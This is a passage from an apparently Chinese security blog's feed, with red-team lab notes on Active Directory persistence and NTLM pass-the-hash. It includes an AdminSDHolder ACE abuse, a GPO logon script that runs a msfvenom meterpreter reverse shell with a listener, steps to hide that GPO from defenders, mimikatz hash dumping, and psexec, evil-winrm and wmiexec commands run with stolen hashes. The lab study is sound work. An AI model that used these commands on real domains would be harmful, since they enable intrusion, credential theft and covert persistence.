其他组是啥就无所谓了</p></blockquote><p>然后我们ssh—-登录低权限用户</p><p>执行<code>dir \\thmdc.za.tryhackme.loc\c$\</code> </p><p><img src="../images/image-20230925113415104.png" alt="image-20230925113415104"></p><p>我们还要验证一下，即使我们创建了多个组，域管理员组也只有一个新成员：</p><p><img src="../images/image-20230925113530594.png" alt="image-20230925113530594"></p><h3 id="危害性"><a href="#危害性" class="headerlink" title="危害性"></a>危害性</h3><p>如果这是一个真正的组织，我们就不会创建新的团体来嵌套。相反，我们将利用现有组来执行嵌套。然而，这是你在正常的红队评估中永远不会做的事情，而且几乎总是在这一点上脱链，因为它破坏了组织的AD结构，如果我们充分打破它，他们将无法恢复。在这一点上，即使蓝队能够把我们踢出去，该组织很可能仍然必须从头开始重建他们的整个AD结构，从而导致重大损失。</p><p><strong>就是证书伪造一样  危害性比较大  在正常的红队评估里面是不太会用到的  因为可能回导致整个域的重组</strong>  </p><h2 id="通过-ACL-实现持久性"><a href="#通过-ACL-实现持久性" class="headerlink" title="通过 ACL 实现持久性"></a>通过 ACL 实现持久性</h2><h3 id="通过-AD-组模板持久化"><a href="#通过-AD-组模板持久化" class="headerlink" title="通过 AD 组模板持久化"></a>通过 AD 组模板持久化</h3><p>上面的嵌套组的话有个缺点就是会被蓝队发现并删除  但是如果我们注入到生成默认组的模板中。通过注入这些模板，即使它们删除了我们的会员资格，我们只需要等到模板刷新，我们将再次被授予会员资格。</p><p><strong>(这就和注入嵌套组不一样了  因为这里的话即使组被删除了  等模板刷新  我们的组还是会重新生成)</strong></p><p>一个这样的模板是 AdminSDHolder 容器。此容器存在于每个 AD 域中，其访问控制列表 （ACL） 用作模板，用于将权限复制到所有受保护组。受保护组包括特权组，例如域管理员、管理员、企业管理员和架构管理员</p><p>一个名为 SDProp 的进程获取 AdminSDHolder 容器的 ACL，并每 60 分钟将其应用于所有受保护组。<strong>因此，我们可以编写一个 ACE，该 ACE 将授予我们对所有受保护组的完全权限   (这里的意思就是我们可以随意更改这些保护组  或者执行其他操作)</strong>。如果蓝队不知道正在使用这种类型的持久性，那将是相当令人沮丧的。每次他们删除对受保护对象或组的不当权限时，该权限都会在一小时内重新出现。由于此重建是通过正常的AD过程进行的，因此它也不会向蓝队显示任何警报，因此更难查明持久性的来源。</p><h3 id="利用-AdminSDHolder"><a href="#利用-AdminSDHolder" class="headerlink" title="利用 AdminSDHolder"></a>利用 AdminSDHolder</h3><p>这里登录先登录一个低权限用户   不用直接登录域控主机  因为rdp的话会把域控管理员踢出会话</p><p>登录之后再使用 <code>runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe</code>  将域控管理员凭证进行注入</p><p>然后我们就拥有域控管理员权限了  然后在执行MMC  </p><p><img src="../images/image-20230926105621585.png" alt="image-20230926105621585"></p><p>然后在模板处  将我们这个低权限用户假如到该模板中</p><p><img src="../images/image-20230926105710849.png" alt="image-20230926105710849"></p><p>现在我们只需要等待 60 分钟，我们的用户就可以完全控制所有受保护组。这是因为<strong>安全描述符传播器 （SDProp） 服务</strong>每 60 分钟自动执行一次，并将此更改传播到所有受保护组</p><p><strong>(也可以将自己添加到域控管理员中)</strong></p><h2 id="通过-GPO-实现持久性"><a href="#通过-GPO-实现持久性" class="headerlink" title="通过 GPO 实现持久性"></a>通过 GPO 实现持久性</h2><h3 id="域范围的持久性"><a href="#域范围的持久性" class="headerlink" title="域范围的持久性"></a>域范围的持久性</h3><p>以下是一些常见的 GPO 持久性技术：</p><ul><li>受限组成员身份 - 这可能允许我们对域中的所有主机进行管理访问</li></ul><p><strong>（因为受限组成员就是只能执行某些权限  相当于委派一样  如果我们拿下域控的话  我们就可以给这些组用户一些高级权限来访问其他主机)</strong></p><ul><li>登录脚本部署 - 这将确保每次用户向域中的主机进行身份验证时，我们都会收到 shell 回调。</li></ul><h3 id="利用GPO"><a href="#利用GPO" class="headerlink" title="利用GPO"></a>利用GPO</h3><p>在我们创建之前  先使用<code>msfvenom</code>来生成这个exe和bat文件  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe &gt; &lt;username&gt;_shell.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//bat文件</span><br><span class="line"></span><br><span class="line">@echo off</span><br><span class="line">rem </span><br><span class="line">rem </span><br><span class="line">asd_shell.exe</span><br><span class="line"></span><br><span class="line">rem </span><br><span class="line"></span><br><span class="line">//这个exe文件要和这个bat文件在一个m</span><br></pre></td></tr></table></figure><p>Windows允许我们通过登录GPO执行Batch或PowerShell脚本。批处理脚本通常比 PowerShell 脚本更稳定，因此让我们创建一个将可执行文件复制到主机并在用户进行身份验证后执行它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用scp将在自己服务器上生成的文件上传到这个windows主机上</p><p>然后打开监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit&quot;</span><br></pre></td></tr></table></figure><h3 id="配置GPO"><a href="#配置GPO" class="headerlink" title="配置GPO"></a>配置GPO</h3><p>上面该生成的文件已经生成完了  我们现在就是配置GPO策略  来使某些用户登录时自动执行我们构造的恶意脚本</p><p><img src="../images/image-20230926143329084.png" alt="image-20230926143329084"></p><p><img src="../images/image-20230926143533350.png" alt="image-20230926143533350"></p><p><strong>这个目录就是专门存放这些脚本的</strong></p><ol><li>rdp登录域控主机后 </li></ol><p>执行<code>mmc</code>命令  然后添加组策略管理”管理单元“</p><p><img src="../images/62aab3368a951e8180c35bef9ed82ead.png" alt="img"></p><p>然后选择Admins这个OU   添加组策略 </p><p><img src="../images/e71058947046aa9b8e77dff06292d15b.png" alt="img"></p><p>右键单击您的策略，然后选择“已强制”。这将确保您的策略将适用，即使存在冲突的策略。这有助于确保我们的 GPO 优先，即使蓝队编写了将删除我们更改的策略。</p><p>让我们回到组策略管理编辑器：</p><ul><li>在“用户配置”下，展开“策略-&gt;Windows 设置”。</li><li>选择“脚本（登录/注销）”。</li><li>右键单击登录&gt;属性</li><li>选择“脚本”选项卡。</li><li>单击“添加&gt;浏览”。</li></ul><p><img src="../images/c74b252805561488167c1a7c5d02dcce.png" alt="GPO edit"></p><p>选择批处理文件作为脚本，然后单击“打开”和“确定”。 单击“应用”和“确定”。</p><p>那么现在这些OU里面的管理员用户只要一登录  脚本就会自动执行  我们这边就会监听到shell</p><h3 id="隐藏GPO"><a href="#隐藏GPO" class="headerlink" title="隐藏GPO"></a>隐藏GPO</h3><p><strong>我们虽然这样做了  但是为了不让蓝队轻易的发现我们设置的GPO  我们还得进行隐藏</strong></p><p>返回到 MMC 窗口，单击策略，然后单击“委派”：</p><p><img src="../images/744c4e6a1dd0a5aef63680cc7cf53120.png" alt="img"></p><p>默认情况下，所有管理员都可以编辑 GPO。让我们删除这些权限：</p><ul><li>右键单击“企业域控制器”，然后选择“编辑设置、删除、修改安全性”。</li><li>单击所有其他组（经过身份验证的用户除外），然后单击删除。</li></ul><p>然后就留下这些委派就行了</p><p><img src="../images/79f5e69b102214a73b605ed86e67aa7d.png" alt="img"></p><p>单击高级并从权限中删除创建的所有者：</p><p><img src="../images/cb338537225085db379e8f5fecf82684.png" alt="GPO edit"></p><p>默认情况下，所有经过身份验证的用户都必须能够读取策略。这是必需的，因为否则，当用户进行身份验证以应用用户策略时，用户帐户无法读取策略，那么就无法执行我们的脚本了</p><p>我们可以将“经过身份验证的用户”替换为“域计算机”，以确保计算机仍可以读取和应用策略，但阻止任何用户读取策略。</p><p><strong>(这样的话就只有计算机的管理员用户能够读取了  我们使用用户登录的话就不能进行读取了)</strong></p><ul><li>单击添加。</li><li>键入“域计算机”，单击“检查名称”，然后单击“确定”。</li><li>选择读取权限，然后单击确定。</li><li>单击经过身份验证的用户，然后单击删除。</li></ul><p><img src="../images/c960f0e9443e92abe52a4993e7ad1287.png" alt="img"></p><p>这样的话我们就不能读取这个GPO策略了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的使用这个的前提就是已经拿下域控了  并且拿下管理员账户了&lt;/p&gt;
&lt;p&gt;为了防止蓝队把我们踢出局  所以执行这个是必要的&lt;/p&gt;
&lt;h2 id=&quot;DC-Sync&quot;&gt;&lt;a href=&quot;#DC-Sync&quot; class=&quot;headerlink&quot; title=&quot;DC Sync</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Windows-NTLM与PTH</title>
    <link href="https://ke1nys.github.io/posts/4c70f180.html"/>
    <id>https://ke1nys.github.io/posts/4c70f180.html</id>
    <published>2023-09-16T11:22:08.000Z</published>
    <updated>2023-09-16T13:53:03.394Z</updated>
    
    <content type="html"><![CDATA[<p>写这篇文章也是在打春秋云镜Time靶机的时候遇到这个东西  于是就想写篇文章来记录学习一下  thm虽然也讲了  但是自己写一遍记录的话还是能够加深印象的</p><h2 id="NTLM-身份验证原理"><a href="#NTLM-身份验证原理" class="headerlink" title="NTLM 身份验证原理"></a>NTLM 身份验证原理</h2><p>这个NTLM协议和Kerberos就是域中身份验证的两大协议  </p><p><img src="../images/9434c96e1bc0519f8d851b44d85b6702-16948638146502.png" alt="NTLM authentication"></p><p>这个NTLM协议相比于Kerberos协议是稍微简陋了一点  所以这就是为什么Kerberos协议是主流的原因</p><ol><li>客户端向要访问的服务器发送身份验证请求。</li><li>服务器生成一个随机数，并将其作为质询发送给客户端。</li><li>客户端将其 NTLM 密码哈希与质询（和其他已知数据）相结合，以生成对质询的响应，并将其发送回服务器进行验证。</li><li>服务器将质询和响应转发到域控制器进行验证。</li><li>域控制器使用质询重新计算响应，并将其与客户端发送的初始响应进行比较。如果它们都匹配，则客户端进行身份验证;否则，访问将被拒绝。身份验证结果将发送回服务器。</li><li>服务器将身份验证结果转发到客户端</li></ol><p>就是这么个身份验证原理</p><p><strong>(那么这个协议使用少的话肯定是有他自己的原因的  接下来就讲一下这个PTH攻击  就是因为这个协议的验证过于简陋造成的)</strong></p><h2 id="PTH攻击"><a href="#PTH攻击" class="headerlink" title="PTH攻击"></a>PTH攻击</h2><p>由于从我们已获得管理权限的主机中提取凭据（通过使用 mimikatz 或类似工具），我们可能会获得易于破解的明文密码或哈希。但是，如果我们不够幸运，我们最终会得到<strong>未破解的 NTLM 密码哈希</strong>。</p><p>尽管我们似乎无法真正使用这些哈希，但只需知道密码哈希即可响应身份验证期间发送的 NTLM 质询。这意味着我们可以进行身份验证，而无需知道明文密码。如果将 Windows 域配置为使用 NTLM 身份验证，则不必破解 NTLM 哈希，我们可以传递哈希 （PtH） 并成功进行身份验证。</p><p>要提取 NTLM 哈希，我们可以使用 mimikatz 读取<strong>本地 SAM</strong> 或直接从 <strong>LSASS 内存</strong>中提取哈希。</p><ul><li><strong>本地SAM进行读取</strong></li></ul><p>这个的话是只能读取这个计算下用户的hash值  并不能提取到别的</p><blockquote><p>lsadump::sam  </p></blockquote><ul><li><strong>LSASS 内存进行读取</strong></li></ul><p>这个的话是可以提取本地用户和最近登录到计算机的任何域用户的任何 NTLM 哈希</p><blockquote><p>sekurlsa::msv </p></blockquote><p>那么我们只需要获取到这个NTLM哈希后  我们就可以开始进行PTH攻击了</p><h3 id="PTH连接RDP"><a href="#PTH连接RDP" class="headerlink" title="PTH连接RDP"></a>PTH连接RDP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH</span><br></pre></td></tr></table></figure><h3 id="PTH-通过-psexec-连接"><a href="#PTH-通过-psexec-连接" class="headerlink" title="PTH 通过 psexec 连接"></a>PTH 通过 psexec 连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP</span><br><span class="line"></span><br><span class="line">知道账号密码的话</span><br><span class="line">proxychains psexec.py xiaorang.lab/Hacker:&#x27;Hacker123!&#x27;@WIN2019.xiaorang.lab -dc-ip 172.22.6.12</span><br><span class="line"></span><br><span class="line">//xiaorang.lab--域名</span><br><span class="line">//Hacker:&#x27;Hacker123!&#x27;--账号密码</span><br><span class="line">//WIN2019主机名</span><br><span class="line">//xiaorang.lab--域名</span><br><span class="line">//172.22.6.12--主机ip--也是域控ip</span><br></pre></td></tr></table></figure><p><strong>(必须在linux环境下进行连接)</strong></p><p>psexec的话都是直接连接到这个windows终端  </p><p><strong>这个psexec的使用条件是有点苛刻的</strong></p><ul><li>对方主机开启了 admin共享，如果关闭了admin共享，会提示：找不到网络名</li><li>如果是工作组环境，则必须使用administrator用户连接，使用普通用户连接会提示：登录失败: 未授予用户在此计算机上的请求登录类型。</li><li>如果是域环境，连接普通域主机可以用普通域用户，连接域控需要域管理员。</li><li>这里用非域管，就提示登录失败</li></ul><p><strong>如何判断是组还是域</strong></p><blockquote><ul><li>wmic computersystem get domain：如果返回结果是一个域名，那么系统处于域环境。</li><li>wmic computersystem get workgroup：如果返回结果是一个工作组名称，那么系统处于工作组环境。</li></ul></blockquote><h3 id="PTH连接WinRM"><a href="#PTH连接WinRM" class="headerlink" title="PTH连接WinRM"></a>PTH连接WinRM</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH</span><br></pre></td></tr></table></figure><p>这个的话也是连接到这个windows终端</p><p><strong>使用WIM也是可以的</strong>    只不过这个的话是需要密码明文的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-wmiexec  XIAORANG/administrator@172.22.6.12   -hashes :04d93ffd6f5f6e4490e0de23f240a5e9</span><br><span class="line"></span><br><span class="line">//XIAORANG ---域名</span><br><span class="line">//administrator--域管理员</span><br><span class="line">//172.22.6.12--windows主机--也是域控主机</span><br><span class="line">//获得的hash值</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写这篇文章也是在打春秋云镜Time靶机的时候遇到这个东西  于是就想写篇文章来记录学习一下  thm虽然也讲了  但是自己写一遍记录的话还是能够加深印象的&lt;/p&gt;
&lt;h2 id=&quot;NTLM-身份验证原理&quot;&gt;&lt;a href=&quot;#NTLM-身份验证原理&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
</feed>
